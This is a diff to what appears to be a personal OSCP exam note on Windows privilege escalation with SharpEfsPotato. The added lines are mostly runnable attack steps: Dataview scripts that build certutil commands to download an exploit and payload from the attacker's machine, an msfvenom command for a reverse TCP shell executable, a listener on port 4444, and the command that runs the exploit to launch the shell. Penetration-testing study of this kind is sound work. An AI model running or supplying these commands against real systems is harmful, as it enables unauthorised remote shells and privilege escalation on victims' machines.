@@ -91,6 +91,42 @@ This tool has never failed once on my side and is very reliable. You can look at
 - Execute this on TARGET:
 ```./SharpEfsPotato.exe -p shell.exe```
 
+```
+cd ~/Desktop/Tools/Windows && python -m http.server 80
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `certutil.exe -f -urlcache -split http://${KaliIP}/SharpEfsPotato.exe SharpEfsPotato.exe`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+#### Generate MSFvenom payload
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `msfvenom -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=${KaliIP} -f exe -o shell.exe`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `certutil.exe -f -urlcache -split http://${KaliIP}/shell.exe shell.exe`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+#### Start Penelope Listener
+
+```
+cd ~/Desktop/Tools/ && python3 penelope.py -p 4444
+```
+#### Run
+```
+./SharpEfsPotato.exe -p shell.exe
+```
+
+
 Let me know how it goes 😉
 ## GodPotato.exe
 
